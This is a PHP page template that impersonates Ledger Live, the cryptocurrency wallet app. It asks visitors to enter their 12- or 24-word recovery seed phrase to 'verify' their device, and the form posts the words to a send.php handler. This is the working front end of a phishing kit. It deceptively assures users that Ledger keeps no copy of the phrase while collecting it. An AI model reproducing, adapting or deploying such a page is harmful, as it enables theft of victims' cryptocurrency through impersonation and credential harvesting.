<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Ledger Live';
        include_once './includes/meta.php';
        
        unset($_SESSION['phone_number']);
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <?php include_once './includes/sidebar.php'; ?>
        <div class="with_sidebar" style="padding-top: 60px;">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-sm-12 px50">
                        <h1 class="fs28">VERIFY SEED PHRASE OF YOUR DEVICE</h1>
                        <p class="my20 text-white-50">Enter your Recovery Seed Phrase Words to Import &amp; Download Your Wallet App.</p>
                        <p class="my20 text-white-50">**Ledger does not keep a copy of your recovery phrase.</p>
                        <p class="my20 text-white-50 fs14">**ENTER 24 SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
                        <div class="pt20 pb10">
                            <button data-word="12" class="btn btn-dark px20 formactive activeForm">12 Words</button>
                            <button data-word="24" class="btn btn-dark px20 ms20 activeForm">24 Words</button>
                        </div>
                        <form method="post" action="<?= base_url('send.php')?>" class="py10">
                            <div class="row form_keys"></div>
                            <div class="row">
                                <div class="col-sm-12 my20">
                                    <button type="submit" class="btn btn-white-50 rounded-pill text-white border px40 fs16 py10 ">Continue ...</button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>